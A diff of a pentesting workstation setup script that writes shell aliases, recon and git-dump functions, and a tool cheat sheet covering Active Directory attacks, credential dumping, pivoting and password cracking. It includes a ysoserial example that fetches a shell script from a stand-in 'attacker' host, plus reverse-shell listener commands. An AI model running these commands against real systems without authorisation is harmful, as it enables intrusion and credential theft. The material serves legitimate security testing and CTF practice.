 [[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh
 
-# Custom PATH
-export PATH=$PATH:$HOME/go/bin:$HOME/.local/bin:/root/go/bin
+# Custom PATH - Includes Go and Ruby gem binaries
+export PATH=$PATH:$HOME/go/bin:$HOME/.local/bin:$HOME/.gem/ruby/$(ls $HOME/.gem/ruby/)/bin
 
 # Environment variables
 export EDITOR=vim
@@ -458,6 +380,7 @@ alias grep='grep --color=auto'
 alias c='clear'
 alias h='history'
 alias please='sudo'
+alias rl='rlwrap nc'  # netcat with history/line-editing
 
 # Aliases - Pentesting
 alias nmap-quick='nmap -sV -sC -O'
@@ -470,14 +393,27 @@ alias ports='netstat -tulanp'
 alias listening='lsof -i -P -n | grep LISTEN'
 
 # Aliases - Tool shortcuts
-alias nxc='netexec'  # Short form for NetExec
+alias nxc='netexec'  # Short form for NetExec
 alias smb='netexec smb'
 alias winrm='netexec winrm'
 alias bloodhound='bloodhound-python'
 alias peas='linpeas.sh'
-alias secrets='gitleaks detect --source'  # Quick secret scan
-alias ysoserial='java -jar ~/tools/ysoserial.jar'  # Java deserialization
-alias pwn='gdb -q'  # Quick GDB with pwndbg
+alias secrets='gitleaks detect --source'  # Quick secret scan
+alias ysoserial='java -jar ~/tools/ysoserial.jar'  # Java deserialization
+alias pwn='gdb -q'  # Quick GDB with pwndbg
+
+# Aliases - Impacket Shortcuts (Installed via pip3 in Phase 4)
+# Allows running tools without the .py extension.
+alias secretsdump='secretsdump.py'
+alias getnpusers='GetNPUsers.py'
+alias getuserspns='GetUserSPNs.py'
+alias psexec='psexec.py'
+alias smbexec='smbexec.py'
+alias wmiexec='wmiexec.py'
+alias dcomexec='dcomexec.py'
+alias ticketer='ticketer.py'
+alias lookupsid='lookupsid.py'
+alias atexec='atexec.py'
 
 # Aliases - Navigation
 alias tools='cd ~/tools'
@@ -488,109 +424,112 @@ alias engagements='cd ~/engagements'
 
 # Functions
 newengagement() {
-    if [ -z "$1" ]; then
-        echo "Usage: newengagement <name>"
-        return 1
-    fi
-    mkdir -p ~/engagements/$1/{recon,scans,exploits,loot,notes,screenshots}
-    cd ~/engagements/$1
-    echo "# $1 Engagement" > notes/README.md
-    echo "Created engagement: $1"
-    ls -la
+    if [ -z "$1" ]; then
+        echo "Usage: newengagement <name>"
+        return 1
+    fi
+    mkdir -p ~/engagements/$1/{recon,scans,exploits,loot,notes,screenshots}
+    cd ~/engagements/$1
+    echo "# $1 Engagement" > notes/README.md
+    echo "Created engagement: $1"
+    ls -la
 }
 
 quickscan() {
-    if [ -z "$1" ]; then
-        echo "Usage: quickscan <target>"
-        return 1
-    fi
-    nmap -sV -sC -oA quickscan_$(date +%Y%m%d_%H%M%S) $1
+    if [ -z "$1" ]; then
+        echo "Usage: quickscan <target>"
+        return 1
+    fi
+    nmap -sV -sC -O -oA quickscan_$(date +%Y%m%d_%H%M%S) $1
 }
 
+# FIXED: Enhanced extract function to handle more compression types
 extract() {
-    if [ -f $1 ]; then
-        case $1 in
-            *.tar.bz2)   tar xjf $1     ;;
-            *.tar.gz)    tar xzf $1     ;;
-            *.bz2)       bunzip2 $1     ;;
-            *.rar)       unrar e $1     ;;
-            *.gz)        gunzip $1      ;;
-            *.tar)       tar xf $1      ;;
-            *.tbz2)      tar xjf $1     ;;
-            *.tgz)       tar xzf $1     ;;
-            *.zip)       unzip $1       ;;
-            *.Z)         uncompress $1  ;;
-            *.7z)        7z x $1        ;;
-            *)           echo "'$1' cannot be extracted via extract()" ;;
-        esac
-    else
-        echo "'$1' is not a valid file"
-    fi
+    if [ -f $1 ]; then
+        case $1 in
+            *.tar.bz2)   tar xjf $1         ;;
+            *.tar.gz)    tar xzf $1         ;;
+            *.bz2)       bunzip2 $1         ;;
+            *.rar)       unrar e $1         ;;
+            *.gz)        gunzip $1          ;;
+            *.tar)       tar xf $1          ;;
+            *.tbz2)      tar xjf $1         ;;
+            *.tgz)       tar xzf $1         ;;
+            *.zip)       unzip $1           ;;
+            *.Z)         uncompress $1      ;;
+            *.7z)        7z x $1            ;; # 7zip support
+            *.deb)      dpkg-deb -x $1 $(mktemp -d) ;; # Debian package
+            *.iso)      echo "Use: sudo mount -o loop $1 /mnt" ;; # ISO advice
+            *)           echo "'$1' cannot be extracted via extract()" ;;
+        esac
+    else
+        echo "'$1' is not a valid file"
+    fi
 }
 
 # reconchain: Quick recon workflow with ProjectDiscovery tools
 reconchain() {
-    if [ -z "$1" ]; then
-        echo "Usage: reconchain <domain>"
-        return 1
-    fi
-    echo "[+] Starting reconnaissance chain for: $1"
-    echo "[*] Subfinder → DNSx → HTTPx → Nuclei"
-    subfinder -d $1 -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
+    if [ -z "$1" ]; then
+        echo "Usage: reconchain <domain>"
+        return 1
+    fi
+    echo "[+] Starting reconnaissance chain for: $1"
+    echo "[*] Subfinder → DNSx → HTTPx → Nuclei"
+    subfinder -d $1 -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
 }
 
 # gitanalyze: Complete Git repository disclosure workflow
 gitanalyze() {
-    if [ -z "$1" ]; then
-        echo "Usage: gitanalyze <git-url>"
-        echo "Example: gitanalyze http://target.com/.git/"
-        return 1
-    fi
-    
-    local url="$1"
-    local output_dir="git-dump-$(date +%Y%m%d_%H%M%S)"
-    
-    echo "[+] Git Repository Analysis Workflow"
-    echo "[*] Target: $url"
-    echo ""
-    
-    # Step 1: Dump the repository
-    echo "[1/4] Dumping .git repository..."
-    git-dumper "$url" "$output_dir" || {
-        echo "[-] git-dumper failed, trying GitTools..."
-        bash ~/tools/repos/GitTools/Dumper/gitdumper.sh "$url" "$output_dir"
-    }
-    
-    # Step 2: Extract all commits
-    echo "[2/4] Extracting commits..."
-    bash ~/tools/repos/GitTools/Extractor/extractor.sh "$output_dir" "${output_dir}-extracted"
-    
-    # Step 3: Scan for secrets with gitleaks
-    echo "[3/4] Scanning for secrets with gitleaks..."
-    gitleaks detect --source "$output_dir" --report-path "${output_dir}-gitleaks.json" --report-format json || true
-    
-    # Step 4: Scan with truffleHog
-    echo "[4/4] Scanning with truffleHog..."
-    trufflehog filesystem "$output_dir" --json > "${output_dir}-trufflehog.json" || true
-    
-    echo ""
-    echo "[+] Analysis complete!"
-    echo "    Repository: $output_dir"
-    echo "    Extracted commits: ${output_dir}-extracted"
-    echo "    Gitleaks report: ${output_dir}-gitleaks.json"
-    echo "    TruffleHog report: ${output_dir}-trufflehog.json"
-    echo ""
-    echo "[!] Don't forget to check:"
-    echo "    - docker-compose.yml"
-    echo "    - .env files"
-    echo "    - config/ directories"
-    echo "    - Database connection strings"
+    if [ -z "$1" ]; then
+        echo "Usage: gitanalyze <git-url>"
+        echo "Example: gitanalyze http://target.com/.git/"
+        return 1
+    fi
+    
+    local url="$1"
+    local output_dir="git-dump-$(date +%Y%m%d_%H%M%S)"
+    
+    echo "[+] Git Repository Analysis Workflow"
+    echo "[*] Target: $url"
+    echo ""
+    
+    # Step 1: Dump the repository
+    echo "[1/4] Dumping .git repository..."
+    git-dumper "$url" "$output_dir" || {
+        echo "[-] git-dumper failed, trying GitTools..."
+        bash ~/tools/repos/GitTools/Dumper/gitdumper.sh "$url" "$output_dir"
+    }
+    
+    # Step 2: Extract all commits
+    echo "[2/4] Extracting commits..."
+    bash ~/tools/repos/GitTools/Extractor/extractor.sh "$output_dir" "${output_dir}-extracted"
+    
+    # Step 3: Scan for secrets with gitleaks
+    echo "[3/4] Scanning for secrets with gitleaks..."
+    gitleaks detect --source "$output_dir" --report-path "${output_dir}-gitleaks.json" --report-format json || true
+    
+    # Step 4: Scan with truffleHog
+    echo "[4/4] Scanning with truffleHog..."
+    trufflehog filesystem "$output_dir" --json > "${output_dir}-trufflehog.json" || true
+    
+    echo ""
+    echo "[+] Analysis complete!"
+    echo "    Repository: $output_dir"
+    echo "    Extracted commits: ${output_dir}-extracted"
+    echo "    Gitleaks report: ${output_dir}-gitleaks.json"
+    echo "    TruffleHog report: ${output_dir}-trufflehog.json"
+    echo ""
+    echo "[!] Don't forget to check:"
+    echo "    - docker-compose.yml"
+    echo "    - .env files"
+    echo "    - config/ directories"
+    echo "    - Database connection strings"
 }
 ZSH_EOF
 
-    # Configure tmux
-    log_progress "Configuring tmux..."
-    cat > $USER_HOME/.tmux.conf << 'TMUX_EOF'
+    # Configure tmux
+    log_progress "Configuring tmux..."
+    cat > $USER_HOME/.tmux.conf << 'TMUX_EOF'
 # Set prefix to Ctrl-a
 unbind C-b
 set-option -g prefix C-a
@@ -630,9 +569,9 @@ set -g pane-active-border-style 'fg=colour51'
 set -g message-style 'fg=colour232 bg=colour166 bold'
 TMUX_EOF
 
-    # Configure vim
-    log_progress "Configuring vim..."
-    cat > $USER_HOME/.vimrc << 'VIM_EOF'
+    # Configure vim
+    log_progress "Configuring vim..."
+    cat > $USER_HOME/.vimrc << 'VIM_EOF'
 " Basic settings
 set number
 set relativenumber
@@ -675,14 +614,14 @@ nnoremap <leader>w :w<CR>
 nnoremap <leader>q :q<CR>
 VIM_EOF
 
-    # Create CTF Tools Reference on Desktop
-    log_info "Creating comprehensive tool reference guide"
-    CREATION_DATE=$(date '+%Y-%m-%d %H:%M:%S %Z')
-    
-    cat > $USER_HOME/Desktop/CTF_TOOLS_REFERENCE.txt << TOOLS_EOF
+    # Create CTF Tools Reference on Desktop
+    log_info "Creating comprehensive tool reference guide"
+    CREATION_DATE=$(date '+%Y-%m-%d %H:%M:%S %Z')
+    
+    cat > $USER_HOME/Desktop/CTF_TOOLS_REFERENCE.txt << TOOLS_EOF
 ═══════════════════════════════════════════════════════════════════════════
-                    PARROT PENTESTING TOOLKIT REFERENCE
-                          Modern 2025 Edition
+                    PARROT PENTESTING TOOLKIT REFERENCE
+                          Modern 2025 Edition
 ═══════════════════════════════════════════════════════════════════════════
 
 RECONNAISSANCE & ENUMERATION
@@ -690,49 +629,49 @@ RECONNAISSANCE & ENUMERATION
 
 PORT SCANNING
 nmap
-  Network exploration and security auditing
-  Quick: nmap -sV -sC <target>
-  Full: nmap -sV -sC -O -p- <target>
-  UDP: nmap -sU -sV <target>
+  Network exploration and security auditing
+  Quick: nmap -sV -sC <target>
+  Full: nmap -sV -sC -O -p- <target>
+  UDP: nmap -sU -sV <target>
 
 naabu
-  Fast port scanner (ProjectDiscovery)
-  Usage: naabu -host <target> -p - -silent | nmap -sV -iL -
-  Note: Much faster than nmap for initial discovery
+  Fast port scanner (ProjectDiscovery)
+  Usage: naabu -host <target> -p - -silent | nmap -sV -iL -
+  Note: Much faster than nmap for initial discovery
 
 SUBDOMAIN ENUMERATION
 subfinder
-  Fast passive subdomain discovery (ProjectDiscovery)
-  Usage: subfinder -d <domain> -silent | tee subdomains.txt
+  Fast passive subdomain discovery (ProjectDiscovery)
+  Usage: subfinder -d <domain> -silent | tee subdomains.txt
 
 dnsx
-  DNS toolkit with bruteforcing (ProjectDiscovery)
-  Usage: dnsx -l subdomains.txt -a -resp -silent
+  DNS toolkit with bruteforcing (ProjectDiscovery)
+  Usage: dnsx -l subdomains.txt -a -resp -silent
 
 WEB ENUMERATION
 httpx
-  HTTP toolkit with tech detection (ProjectDiscovery)
-  Usage: httpx -l targets.txt -tech-detect -status-code -title
+  HTTP toolkit with tech detection (ProjectDiscovery)
+  Usage: httpx -l targets.txt -tech-detect -status-code -title
 
 katana
-  Next-generation web crawler (ProjectDiscovery)
-  Usage: katana -u <url> -d 3 -jc -kf all
+  Next-generation web crawler (ProjectDiscovery)
+  Usage: katana -u <url> -d 3 -jc -kf all
 
 nuclei
-  Vulnerability scanner with templates (ProjectDiscovery)
-  Usage: nuclei -l targets.txt -severity critical,high
-  Update templates: nuclei -update-templates
+  Vulnerability scanner with templates (ProjectDiscovery)
+  Usage: nuclei -l targets.txt -severity critical,high
+  Update templates: nuclei -update-templates
 
 ffuf
-  Fast web fuzzer
-  Usage: ffuf -u http://target/FUZZ -w wordlist.txt
-  Dir: ffuf -u http://target/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+  Fast web fuzzer
+  Usage: ffuf -u http://target/FUZZ -w wordlist.txt
+  Dir: ffuf -u http://target/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 
 gobuster
-  Directory/DNS/vhost brute-forcer
-  Dir: gobuster dir -u <url> -w <wordlist>
-  DNS: gobuster dns -d <domain> -w <wordlist>
-  Vhost: gobuster vhost -u <url> -w <wordlist>
+  Directory/DNS/vhost brute-forcer
+  Dir: gobuster dir -u <url> -w <wordlist>
+  DNS: gobuster dns -d <domain> -w <wordlist>
+  Vhost: gobuster vhost -u <url> -w <wordlist>
 
 ═══════════════════════════════════════════════════════════════════════════
 WINDOWS / ACTIVE DIRECTORY
@@ -740,165 +679,173 @@ WINDOWS / ACTIVE DIRECTORY
 
 CREDENTIAL ATTACKS
 netexec (nxc)
-  Modern CrackMapExec replacement - Swiss Army knife for AD
-  SMB: nxc smb <target> -u <user> -p <pass>
-  WinRM: nxc winrm <target> -u <user> -p <pass>
-  Spray: nxc smb <targets> -u users.txt -p passwords.txt --continue-on-success
-  Shares: nxc smb <target> -u <user> -p <pass> --shares
-  SAM: nxc smb <target> -u <user> -p <pass> --sam
-  LSA: nxc smb <target> -u <user> -p <pass> --lsa
+  Modern CrackMapExec replacement - Swiss Army knife for AD
+  SMB: nxc smb <target> -u <user> -p <pass>
+  WinRM: nxc winrm <target> -u <user> -p <pass>
+  Spray: nxc smb <targets> -u users.txt -p passwords.txt --continue-on-success
+  Shares: nxc smb <target> -u <user> -p <pass> --shares
+  SAM: nxc smb <target> -u <user> -p <pass> --sam
+  LSA: nxc smb <target> -u <user> -p <pass> --lsa
 
 kerbrute
-  Kerberos user enumeration and password spraying
-  User enum: kerbrute userenum -d <domain> --dc <dc-ip> users.txt
-  Password spray: kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt <password>
+  Kerberos user enumeration and password spraying
+  User enum: kerbrute userenum -d <domain> --dc <dc-ip> users.txt
+  Password spray: kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt <password>
 
-Impacket Suite
-  All tools work WITHOUT 'impacket-' prefix!
-  
-  GetNPUsers.py
-    AS-REP roasting - find users without Kerberos pre-auth
-    Usage: GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile users.txt -format hashcat
-  
-  GetUserSPNs.py
-    Kerberoasting - extract service ticket hashes
-    Usage: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request
-  
-  secretsdump.py
-    Dump credentials from various sources
-    Usage: secretsdump.py <domain>/<user>:<pass>@<target>
-    Local: secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
-  
-  psexec.py / wmiexec.py / smbexec.py / dcomexec.py
-    Remote command execution
-    Usage: psexec.py <domain>/<user>:<pass>@<target>
-  
-  getTGT.py / getST.py
-    Kerberos ticket manipulation
-    Usage: getTGT.py <domain>/<user>:<pass>
-  
-  ticketer.py
-    Forge Kerberos tickets (Golden/Silver ticket attacks)
-    Usage: ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> <user>
+Impacket Suite (Aliases installed: 'secretsdump', 'psexec', 'getnpusers', etc.)
+  All tools work WITHOUT the 'impacket-' OR the '.py' suffix!
+   
+  getnpusers
+    AS-REP roasting - find users without Kerberos pre-auth
+    Usage: getnpusers <domain>/ -dc-ip <dc-ip> -usersfile users.txt -format hashcat
+   
+  getuserspns
+    Kerberoasting - extract service ticket hashes
+    Usage: getuserspns <domain>/<user>:<pass> -dc-ip <dc-ip> -request
+   
+  secretsdump
+    Dump credentials from various sources
+    Usage: secretsdump <domain>/<user>:<pass>@<target>
+    Local: secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+   
+  psexec / wmiexec / smbexec / dcomexec
+    Remote command execution
+    Usage: psexec <domain>/<user>:<pass>@<target>
+   
+  getTGT.py / getST.py
+    Kerberos ticket manipulation
+    Usage: getTGT.py <domain>/<user>:<pass>
+   
+  ticketer
+    Forge Kerberos tickets (Golden/Silver ticket attacks)
+    Usage: ticketer -nthash <hash> -domain-sid <sid> -domain <domain> <user>
 
 ENUMERATION
 bloodhound-python
-  Active Directory relationship mapper
-  Usage: bloodhound-python -u <user> -p <pass> -ns <dc-ip> -d <domain> -c all
+  Active Directory relationship mapper
+  Usage: bloodhound-python -u <user> -p <pass> -ns <dc-ip> -d <domain> -c all
 
 bloodyAD
-  Active Directory privilege escalation framework
-  Usage: bloodyAD -u <user> -p <pass> -d <domain> --host <dc-ip> get object <object>
+  Active Directory privilege escalation framework
+  Usage: bloodyAD -u <user> -p <pass> -d <domain> --host <dc-ip> get object <object>
 
 enum4linux-ng
-  Modern SMB/AD enumeration
-  Usage: enum4linux-ng <target> -A
+  Modern SMB/AD enumeration
+  Usage: enum4linux-ng <target> -A
 
 ADDITIONAL TOOLS
 certipy-ad
-  Active Directory Certificate Services abuse
-  Usage: certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip>
+  Active Directory Certificate Services abuse
+  Usage: certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip>
 
 coercer
-  Force authentication from remote machines
-  Usage: coercer -u <user> -p <pass> -d <domain> -t <target> -l <listener-ip>
+  Force authentication from remote machines
+  Usage: coercer -u <user> -p <pass> -d <domain> -t <target> -l <listener-ip>
 
 pypykatz
-  Mimikatz in Python - parse LSASS dumps
-  Usage: pypykatz lsa minidump lsass.dmp
+  Mimikatz in Python - parse LSASS dumps
+  Usage: pypykatz lsa minidump lsass.dmp
 
 lsassy
-  Remote LSASS credential dumper
-  Usage: lsassy -u <user> -p <pass> -d <domain> <target>
+  Remote LSASS credential dumper
+  Usage: lsassy -u <user> -p <pass> -d <domain> <target>
 
 responder
-  LLMNR/NBT-NS/mDNS poisoner
-  Usage: responder -I eth0 -wv
+  LLMNR/NBT-NS/mDNS poisoner
+  Usage: responder -I eth0 -wv
 
 mitm6
-  IPv6 man-in-the-middle for credential relay
-  Usage: mitm6 -d <domain>
+  IPv6 man-in-the-middle for credential relay
+  Usage: mitm6 -d <domain>
 
 mitmproxy / mitmweb
-  Interactive HTTPS proxy for web app testing
-  Usage: mitmproxy (TUI) or mitmweb (Web UI on :8081)
-  Note: More powerful than Burp for scripting/automation
+  Interactive HTTPS proxy for web app testing
+  Usage: mitmproxy (TUI) or mitmweb (Web UI on :8081)
+  Note: More powerful than Burp for scripting/automation
 
 ═══════════════════════════════════════════════════════════════════════════
 PIVOTING & TUNNELING
 ═══════════════════════════════════════════════════════════════════════════
 
 chisel
-  Fast TCP/UDP tunnel over HTTP
-  Server: chisel server -p 8000 --reverse
-  Client: chisel client <server>:8000 R:socks
+  Fast TCP/UDP tunnel over HTTP
+  Server: chisel server -p 8000 --reverse
+  Client: chisel client <server>:8000 R:socks
 
 ligolo-ng
-  Advanced pivoting (may not be installed if build failed)
-  Proxy: proxy -selfcert
-  Agent: agent -connect <proxy-ip>:11601 -ignore-cert
+  Advanced pivoting (may not be installed if build failed)
+  Proxy: proxy -selfcert
+  Agent: agent -connect <proxy-ip>:11601 -ignore-cert
 
 sshuttle
-  VPN over SSH - no hassle, works everywhere
-  Usage: sshuttle -r user@<target> 10.0.0.0/8
+  VPN over SSH - no hassle, works everywhere
+  Usage: sshuttle -r user@<target> 10.0.0.0/8
 
 ssh
-  SSH tunneling for port forwarding
-  Local forward: ssh -L 8080:localhost:80 user@<target>
-  SOCKS proxy: ssh -D 1080 user@<target>
-  Remote forward: ssh -R 8080:localhost:80 user@<target>
+  SSH tunneling for port forwarding
+  Local forward: ssh -L 8080:localhost:80 user@<target>
+  SOCKS proxy: ssh -D 1080 user@<target>
+  Remote forward: ssh -R 8080:localhost:80 user@<target>
 
 proxychains4
-  Route traffic through SOCKS/HTTP proxies
-  Usage: proxychains4 nmap <target>
-  Config: /etc/proxychains4.conf
-  MSF: set Proxies socks5:127.0.0.1:1080 (native, no proxychains needed)
+  Route traffic through SOCKS/HTTP proxies
+  Usage: proxychains4 nmap <target>
+  Config: /etc/proxychains4.conf
+  MSF: set Proxies socks5:127.0.0.1:1080 (native, no proxychains needed)
+
+xfreerdp
+  RDP client for connecting to Windows systems
+  Usage: xfreerdp /v:<target-ip> /u:<user> /p:<pass>
 
 ═══════════════════════════════════════════════════════════════════════════
 WEB APPLICATION TESTING
 ═══════════════════════════════════════════════════════════════════════════
 
 git-dumper
-  Dump exposed .git repositories
-  Usage: git-dumper http://target/.git/ output_dir/
+  Dump exposed .git repositories
+  Usage: git-dumper http://target/.git/ output_dir/
 
 GIT REPOSITORY ANALYSIS
 
 GitTools
-  Suite for finding and exploiting exposed .git directories
-  Location: ~/tools/repos/GitTools/
-  
-  Finder: Find websites with exposed .git
-    python3 GitTools/Finder/gitfinder.py -i targets.txt
-  
-  Dumper: Download exposed .git repository
-    bash GitTools/Dumper/gitdumper.sh http://target/.git/ output_dir/
-  
-  Extractor: Extract commits from downloaded .git
-    bash GitTools/Extractor/extractor.sh output_dir/ extracted/
+  Suite for finding and exploiting exposed .git directories
+  Location: ~/tools/repos/GitTools/
+   
+  Finder: Find websites with exposed .git
+    python3 GitTools/Finder/gitfinder.py -i targets.txt
+   
+  Dumper: Download exposed .git repository
+    bash GitTools/Dumper/gitdumper.sh http://target/.git/ output_dir/
+   
+  Extractor: Extract commits from downloaded .git
+    bash GitTools/Extractor/extractor.sh output_dir/ extracted/
 
 truffleHog
-  Find secrets and credentials in git history
-  Usage: trufflehog git file:///path/to/repo
-  Remote: trufflehog git https://github.com/user/repo
-  Docker: trufflehog docker --image repo:tag
+  Find secrets and credentials in git history
+  Usage: trufflehog git file:///path/to/repo
+  Remote: trufflehog git https://github.com/user/repo
+  Docker: trufflehog docker --image repo:tag
 
 gitleaks
-  Fast secret detector for git repositories
-  Usage: gitleaks detect --source /path/to/repo
-  Scan file: gitleaks detect -f config.yaml
-  Protect: gitleaks protect (pre-commit hook)
+  Fast secret detector for git repositories
+  Usage: gitleaks detect --source /path/to/repo
+  Scan file: gitleaks detect -f config.yaml
+  Protect: gitleaks protect (pre-commit hook)
 
 gitrob
-  GitHub organization reconnaissance
-  Usage: gitrob <github-org>
-  Note: Requires GitHub API token
+  GitHub organization reconnaissance
+  Usage: gitrob <github-org>
+  Note: Requires GitHub API token
+
+wpscan
+  WordPress vulnerability scanner
+  Usage: wpscan --url http://target.com/ -e vp,vt,u --api-token <token>
 
 COMMON GIT SECRET PATTERNS
-  - AWS Keys: AKIA[0-9A-Z]{16}
-  - Private Keys: -----BEGIN.*PRIVATE KEY-----
-  - Database URLs: mysql://.*:.*@.*
-  - API Keys: api[_-]?key.*['\"][0-9a-zA-Z]{32,}['\"]
+  - AWS Keys: AKIA[0-9A-Z]{16}
+  - Private Keys: -----BEGIN.*PRIVATE KEY-----
+  - Database URLs: mysql://.*:.*@.*
+  - API Keys: api[_-]?key.*['\"][0-9a-zA-Z]{32,}['\"]
 
 ═══════════════════════════════════════════════════════════════════════════
 WEB APPLICATION TESTING
@@ -906,88 +853,112 @@ WEB APPLICATION TESTING
 
 SQL INJECTION
 sqlmap
-  Automated SQL injection exploitation
-  Usage: sqlmap -u <url> --batch --dump
-  POST data: sqlmap -u <url> --data="param=value" --batch
-  Tamper scripts: sqlmap -u <url> --tamper=space2comment
-  Database dump: sqlmap -u <url> -D <db> -T <table> --dump
+  Automated SQL injection exploitation
+  Usage: sqlmap -u <url> --batch --dump
+  POST data: sqlmap -u <url> --data="param=value" --batch
+  Tamper scripts: sqlmap -u <url> --tamper=space2comment
+  Database dump: sqlmap -u <url> -D <db> -T <table> --dump
 
 DESERIALIZATION ATTACKS
 ysoserial
-  Java deserialization payload generator
-  Location: ~/tools/ysoserial.jar
-  Usage: ysoserial <payload> <command>
-  Example: ysoserial CommonsCollections6 "wget http://attacker/shell.sh"
-  List payloads: ysoserial --help
-  Common payloads: CommonsCollections1-7, Spring1-2, URLDNS
+  Java deserialization payload generator
+  Location: ~/tools/ysoserial.jar
+  Usage: ysoserial <payload> <command>
+  Example: ysoserial CommonsCollections6 "wget http://attacker/shell.sh"
+  List payloads: ysoserial --help
+  Common payloads: CommonsCollections1-7, Spring1-2, URLDNS
 
 REVERSE SHELLS
 penelope
-  Feature-rich reverse shell handler
-  Usage: penelope 4444
-  Note: Auto-upgrades shells, handles PTY, session management
+  Feature-rich reverse shell handler
+  Usage: penelope 4444
+  Note: Auto-upgrades shells, handles PTY, session management
+
+rlwrap / socat / nc-openbsd
+  Manual shell handling and connection tools
+  rlwrap nc -lvnp 4444   # Netcat listener with history
+  socat file:`tty`,raw,echo=0 tcp-listen:4445   # Powerful TTY listener
 
 ═══════════════════════════════════════════════════════════════════════════
 PASSWORD CRACKING
 ═══════════════════════════════════════════════════════════════════════════
 
 hashcat
-  GPU-accelerated password cracking
-  NTLM: hashcat -m 1000 hashes.txt rockyou.txt
-  NTLMv2: hashcat -m 5600 hashes.txt rockyou.txt
-  bcrypt: hashcat -m 3200 hashes.txt rockyou.txt
-  SHA256: hashcat -m 1400 hashes.txt rockyou.txt
-  Modes: hashcat --help | grep -i <hash-type>
-  Show cracked: hashcat -m <mode> hashes.txt --show
+  GPU-accelerated password cracking
+  NTLM: hashcat -m 1000 hashes.txt rockyou.txt
+  NTLMv2: hashcat -m 5600 hashes.txt rockyou.txt
+  bcrypt: hashcat -m 3200 hashes.txt rockyou.txt
+  SHA256: hashcat -m 1400 hashes.txt rockyou.txt
+  Modes: hashcat --help | grep -i <hash-type>
+  Show cracked: hashcat -m <mode> hashes.txt --show
 
 john
-  CPU password cracking (John the Ripper)
-  Basic: john --wordlist=rockyou.txt hashes.txt
-  Format: john --format=NT hashes.txt --wordlist=rockyou.txt
-  Show: john --show hashes.txt
-  Incremental: john --incremental hashes.txt
+  CPU password cracking (John the Ripper)
+  Basic: john --wordlist=rockyou.txt hashes.txt
+  Format: john --format=NT hashes.txt --wordlist=rockyou.txt
+  Show: john --show hashes.txt
+  Incremental: john --incremental hashes.txt
 
 CeWL
-  Generate custom wordlists from websites
-  Usage: cewl -d 2 -m 5 -w wordlist.txt <url>
-  With emails: cewl -d 2 -m 5 -e -w wordlist.txt <url>
-  Authentication: cewl -d 2 -m 5 -w wordlist.txt <url> -a
+  Generate custom wordlists from websites
+  Usage: cewl -d 2 -m 5 -w wordlist.txt <url>
+  With emails: cewl -d 2 -m 5 -e -w wordlist.txt <url>
+  Authentication: cewl -d 2 -m 5 -w wordlist.txt <url> -a
 
 ═══════════════════════════════════════════════════════════════════════════
 BINARY EXPLOITATION
 ═══════════════════════════════════════════════════════════════════════════
 
 pwntools
-  Python exploit development library
-  Usage: from pwn import *
-  Example: r = remote('target', 1337)
-  Common: p64(), p32(), cyclic(), asm(), shellcraft
+  Python exploit development library
+  Usage: from pwn import *
+  Example: r = remote('target', 1337)
+  Common: p64(), p32(), cyclic(), asm(), shellcraft
 
 pwndbg
-  Enhanced GDB with pwntools integration
-  Usage: gdb ./binary (pwndbg loads automatically)
-  Commands: checksec, cyclic, vmmap, telescope, heap
-  Breakpoints: break main, run, continue, step
+  Enhanced GDB with pwntools integration
+  Usage: gdb ./binary (pwndbg loads automatically)
+  Commands: checksec, cyclic, vmmap, telescope, heap
+  Breakpoints: break main, run, continue, step
 
 ROPgadget
-  ROP chain builder
-  Usage: ROPgadget --binary ./binary
-  Find gadgets: ROPgadget --binary ./binary --only "pop|ret"
-  ROP chain: ROPgadget --binary ./binary --ropchain
+  ROP chain builder
+  Usage: ROPgadget --binary ./binary
+  Find gadgets: ROPgadget --binary ./binary --only "pop|ret"
+  ROP chain: ROPgadget --binary ./binary --ropchain
+
+one_gadget
+  Find the "one gadget" RCE offsets in libc
+  Usage: one_gadget /lib/x86_64-linux-gnu/libc.so.6
 
 ═══════════════════════════════════════════════════════════════════════════
-OSINT & INFORMATION GATHERING
+CTF / FORENSICS / STEGANOGRAPHY
 ═══════════════════════════════════════════════════════════════════════════
 
-theHarvester
-  OSINT email and subdomain gathering
-  Usage: theHarvester -d <domain> -b all
-  Specific source: theHarvester -d <domain> -b google,linkedin,dnsdumpster
-  Save results: theHarvester -d <domain> -b all -f output.html
+binwalk
+  Firmware/File analysis and extraction tool
+  Usage: binwalk -e <file>   # Extract embedded files
+  Scan: binwalk -P <file>   # Entropy scan
 
-subfinder
-  Fast passive subdomain discovery (covered in RECONNAISSANCE above)
-  Usage: subfinder -d <domain> -silent | tee subdomains.txt
+exiftool
+  Read and write meta information in files
+  Usage: exiftool <file>
+
+steghide
+  Hide/extract data in JPEG/BMP/WAV/AU files
+  Usage: steghide extract -sf <file>
+
+zsteg
+  Detect hidden data in PNG/BMP files
+  Usage: zsteg -E <file>
+
+foremost
+  File carving tool (recover files from raw data)
+  Usage: foremost -i <disk-image>
+
+7z
+  Universal archiver for less common formats
+  Usage: 7z x archive.7z
 
 ═══════════════════════════════════════════════════════════════════════════
 PRIVILEGE ESCALATION
@@ -995,132 +966,87 @@ PRIVILEGE ESCALATION
 
 LINUX
 linpeas.sh
-  Automated Linux privilege escalation scanner
-  Location: ~/linpeas.sh (symlink to ~/tools/repos/PEASS-ng/linPEAS/linpeas.sh)
-  Usage: ./linpeas.sh | tee linpeas_output.txt
-  With colors: ./linpeas.sh -a | tee linpeas_output.txt
+  Automated Linux privilege escalation scanner
+  Location: ~/linpeas.sh (symlink to ~/tools/repos/PEASS-ng/linPEAS/linpeas.sh)
+  Usage: ./linpeas.sh | tee linpeas_output.txt
 
 WINDOWS
 winpeas.exe
-  Automated Windows privilege escalation scanner
-  Location: ~/winpeas.exe (symlink to ~/tools/repos/PEASS-ng/winPEAS/winPEASx64.exe)
-  Transfer to target and run: winpeas.exe
+  Automated Windows privilege escalation scanner
